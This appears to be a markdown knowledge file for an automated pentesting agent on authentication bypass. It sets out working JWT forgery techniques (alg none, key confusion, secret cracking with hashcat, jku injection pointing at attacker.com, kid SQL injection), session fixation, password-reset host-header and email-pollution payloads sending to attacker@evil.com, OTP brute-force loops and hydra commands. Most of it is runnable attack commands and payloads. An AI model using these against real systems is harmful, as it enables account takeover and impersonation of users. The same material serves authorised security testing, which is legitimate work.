---
vuln_type: authentication_bypass
severity: critical
cwe: [CWE-287, CWE-384, CWE-640, CWE-347]
owasp: A07:2021-Identification-and-Authentication-Failures
related_tools: [curl, hydra, ffuf]
exploit_agent: auth_agent
tags: [jwt, session, authentication, bypass, password-reset, 2fa, mfa, token, cookie, session-fixation]
---

# Authentication Bypass

## Overview
Covers attacks against authentication mechanisms: JWT manipulation, session management flaws, password reset vulnerabilities, 2FA/MFA bypass, and credential-related attacks beyond simple brute force.

---

## 1. JWT (JSON Web Token) Attacks

### JWT Structure
```
HEADER.PAYLOAD.SIGNATURE
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature

Header: {"alg":"HS256","typ":"JWT"}
Payload: {"user":"admin","role":"user","exp":1700000000}
Signature: HMAC-SHA256(base64(header) + "." + base64(payload), secret)
```

### Attack 1: Algorithm None
Remove signature verification entirely:
```bash
# Change header to: {"alg":"none","typ":"JWT"}
# Base64: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
# Remove signature (keep trailing dot)

# Original: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE
# Modified: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

# Variations to try:
# "alg": "none"
# "alg": "None"
# "alg": "NONE"
# "alg": "nOnE"
```

### Attack 2: Algorithm Confusion (RS256 → HS256)
If server uses RS256 (asymmetric) but accepts HS256 (symmetric):
```bash
# 1. Get the server's public key (from /jwks.json, /.well-known/jwks.json, or certificate)
# 2. Use the PUBLIC key as the HMAC secret
# 3. Sign with HS256 using the public key

# With jwt_tool:
python3 jwt_tool.py TOKEN -X k -pk public_key.pem

# The server uses the public key to verify HMAC → matches!
```

### Attack 3: Weak Secret (Brute Force)
```bash
# With hashcat
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# With jwt_tool
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# With john
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# Common weak secrets: secret, password, 123456, changeme, key
```

### Attack 4: JWK Header Injection
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "ATTACKER_PUBLIC_KEY_N",
    "e": "AQAB"
  }
}
```
If the server trusts the `jwk` in the header → sign with your own key pair.

### Attack 5: JKU/X5U Header Injection
```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/jwks.json"
}
```
Server fetches attacker's key set → attacker controls verification key.

### Attack 6: kid (Key ID) Injection
```json
{
  "alg": "HS256",
  "kid": "../../dev/null"
}
```
If `kid` is used in file path or SQL query:
- **Path traversal:** `kid: "../../dev/null"` → empty key → sign with empty string
- **SQL injection:** `kid: "key' UNION SELECT 'secret'--"` → control the key value

### Attack 7: Payload Manipulation (after cracking/bypassing signature)
```json
# Escalate role
{"user":"admin","role":"admin","exp":9999999999}

# Change user ID
{"sub":"1","role":"user"} → {"sub":"0","role":"admin"}

# Extend expiration
{"exp":1700000000} → {"exp":9999999999}
```

### JWT Testing Workflow
```bash
# 1. Decode
echo "eyJ..." | base64 -d

# 2. Check algorithm
# If HS256 → try brute force
# If RS256 → try algorithm confusion, jwk/jku injection

# 3. Try none algorithm
# 4. Try modifying payload without changing signature
# 5. Try expired tokens (check if exp is validated)
```

---

## 2. Session Management Attacks

### Session Fixation
```
# Attacker sets victim's session ID before authentication
1. Attacker gets a valid session: PHPSESSID=attacker_session
2. Tricks victim into using it: https://target.com/?PHPSESSID=attacker_session
3. Victim authenticates → session now authenticated
4. Attacker uses same session → authenticated as victim

# Test: Check if session ID changes after login
# If same session ID before and after login → vulnerable
```

### Session ID Prediction
```bash
# Collect multiple session IDs
for i in {1..20}; do
  curl -s -I http://target.com/login | grep "Set-Cookie"
done

# Analyze for patterns:
# Sequential numbers?
# Timestamp-based?
# Weak randomness?
```

### Session ID in URL
```
# Check if session propagates via URL parameter
http://target.com/dashboard?PHPSESSID=abc123
# Session in URL → leaks via Referer header, browser history, logs
```

### Cookie Flags
```bash
# Check Set-Cookie header for missing flags
curl -I http://target.com/login

# Missing Secure flag → cookie sent over HTTP (MITM)
# Missing HttpOnly → accessible via JavaScript (XSS)
# Missing SameSite → sent in cross-site requests (CSRF)
# Domain too broad → cookie shared with subdomains
```

### Session Timeout
```bash
# Test if sessions expire
1. Login, capture session cookie
2. Wait 30 minutes
3. Try using the session
4. If still valid → excessive session timeout

# Test if logout actually invalidates session
1. Login, capture session cookie
2. Click logout
3. Use the captured session cookie
4. If still works → session not invalidated on logout
```

---

## 3. Password Reset Vulnerabilities

### Token in URL (Referer leakage)
```
# Reset URL: https://target.com/reset?token=abc123
# If reset page loads external resources (images, scripts)
# Token leaks via Referer header to third parties
```

### Weak/Predictable Reset Tokens
```bash
# Request multiple reset tokens, look for patterns
# Sequential? Timestamp-based? MD5 of email?

# Test: MD5(email)
echo -n "user@target.com" | md5sum
# Compare with reset token
```

### Token Reuse
```bash
# Use a reset token
# Try using it again → should be invalidated after use
```

### Host Header Injection
```bash
# Manipulate Host header to inject attacker's domain into reset link
curl -X POST http://target.com/forgot-password \
  -H "Host: attacker.com" \
  -d "email=victim@target.com"

# If reset email contains: https://attacker.com/reset?token=TOKEN
# → Victim clicks link → token sent to attacker

# Variations:
-H "Host: attacker.com"
-H "X-Forwarded-Host: attacker.com"
-H "X-Forwarded-Server: attacker.com"
-H "X-Original-URL: https://attacker.com"
```

### Email Parameter Manipulation
```bash
# Add attacker's email to receive a copy
email=victim@target.com&email=attacker@evil.com
email=victim@target.com%0a%0dcc:attacker@evil.com
email=victim@target.com,attacker@evil.com

# Parameter pollution
email=victim@target.com&email=attacker@evil.com

# JSON array
{"email":["victim@target.com","attacker@evil.com"]}
```

### Rate Limiting on Reset
```bash
# Test if multiple reset requests are rate-limited
for i in {1..50}; do
  curl -X POST http://target.com/forgot-password -d "email=victim@target.com"
done
# No rate limit → can spam reset emails (DoS / confusion)
```

---

## 4. 2FA / MFA Bypass

### Direct Access (skip 2FA page)
```bash
# After password login, instead of going to /2fa, go directly to:
curl -b "session=COOKIE" http://target.com/dashboard
# If dashboard loads → 2FA not enforced on all routes
```

### Brute Force OTP
```bash
# If OTP is 4-6 digits and no rate limiting:
for code in $(seq -w 000000 999999); do
  curl -s -b "session=COOKIE" http://target.com/verify-2fa -d "code=$code" | grep -q "success" && echo "Found: $code" && break
done

# With hydra:
hydra -l user -P otp_wordlist.txt target http-post-form "/verify-2fa:code=^PASS^:Invalid code"
```

### Response Manipulation
```bash
# Intercept 2FA verification response
# Change {"success":false} to {"success":true}
# Or change status code 401 → 200
# If client-side check → bypass
```

### Reuse OTP
```bash
# Use a valid OTP code
# Try it again → should be invalidated
# If it works again → OTP reuse vulnerability
```

### Backup Codes
```bash
# Test if backup codes are:
# - Predictable
# - Not invalidated after use
# - Not rate-limited
```

### 2FA via Different Endpoint
```bash
# If 2FA is enforced on web but not:
# - Mobile API
# - Legacy API version
# - Password reset flow
# - OAuth login flow
```

### Race Condition
```bash
# Send valid 2FA code multiple times simultaneously
# If the code generates a session, race to use it before expiry check
```

---

## 5. Registration / Account Manipulation

### Duplicate Registration
```bash
# Register with same email using variations:
admin@target.com
Admin@target.com
admin+1@target.com
admin@target.com%00
admin@target.com\n
```

### Email Verification Bypass
```bash
# Register → skip email verification → access dashboard
# Test if unverified accounts have full access
```

### Mass Assignment / Parameter Pollution
```bash
# Add extra fields during registration
curl -X POST http://target.com/register -d "username=test&password=test&role=admin&isAdmin=true&verified=true"
```

---

## Automated Testing

```bash
# JWT decode
echo "TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null

# JWT none attack
python3 jwt_tool.py TOKEN -X a

# JWT crack
hashcat -m 16500 TOKEN /usr/share/wordlists/rockyou.txt

# Session fixation test
# Get pre-auth session
PRE=$(curl -s -I http://target.com/ | grep -i set-cookie | head -1)
# Login with that session
POST=$(curl -s -I -b "$PRE" http://target.com/login -d "user=x&pass=y" | grep -i set-cookie | head -1)
# Compare: if same session ID → vulnerable

# Password reset host injection
curl -X POST http://target.com/forgot -H "Host: attacker.com" -d "email=test@test.com"
```

---

## Output Interpretation

### Confirmed authentication bypass indicators
- JWT with `alg:none` accepted → full bypass
- JWT secret cracked → can forge any token
- Session ID unchanged after login → session fixation
- Dashboard accessible without 2FA → MFA bypass
- Password reset link contains attacker domain → host header injection
- Expired/reused token still works → token validation failure

### Not a bypass (false positives)
- JWT rejected after modification (signature validation works)
- 2FA page redirects back when skipped (enforcement works)
- Reset token returns "expired" or "invalid" on reuse
- Session ID rotates on authentication

### Severity assessment
- **Critical**: JWT forge/bypass → impersonate any user
- **Critical**: Admin account takeover via password reset manipulation
- **High**: 2FA bypass → authenticated as user without second factor
- **High**: Session fixation → hijack authenticated session
- **Medium**: Session not invalidated on logout
- **Medium**: Missing cookie security flags (Secure, HttpOnly)
- **Low**: Username enumeration via login/reset responses
